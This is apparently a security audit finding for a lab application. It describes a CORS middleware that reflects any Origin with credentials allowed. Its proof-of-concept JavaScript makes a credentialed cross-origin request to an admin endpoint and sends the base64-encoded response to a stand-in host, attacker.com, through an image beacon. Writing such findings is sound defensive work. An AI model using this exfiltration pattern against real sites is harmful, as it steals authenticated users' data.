# H13 — CORS Misconfiguration: Echo Origin + Credentials (F-A3)

**Severity:** High  
**CWE:** CWE-942 | **OWASP:** A05:2021  
**Status:** Confirmed  
**Source draft:** `piolium/findings-draft/p7-023-f-a3-cors-misconfig.md`

## Summary

`middleware/cors.go` echoes the request `Origin` into `Access-Control-Allow-Origin` and sets `Access-Control-Allow-Credentials: true` unconditionally. Any cross-origin attacker page can make credentialed requests and read responses, turning every authenticated endpoint (V05–V11, V12, V14, V15, V19, V20) into a cross-origin browser exploit.

## PoC (cross-origin admin read)

```javascript
// On attacker.com while victim is logged in
fetch('http://localhost:4443/admin/users', {
  credentials: 'include',
  headers: { 'X-Admin-Token': 'lab-admin-bypass-token' }
})
.then(r => r.text())
.then(t => new Image().src = '//attacker.com/?a=' + btoa(t));
```

The browser does not block the read because the server explicitly allows the attacker's origin with credentials.
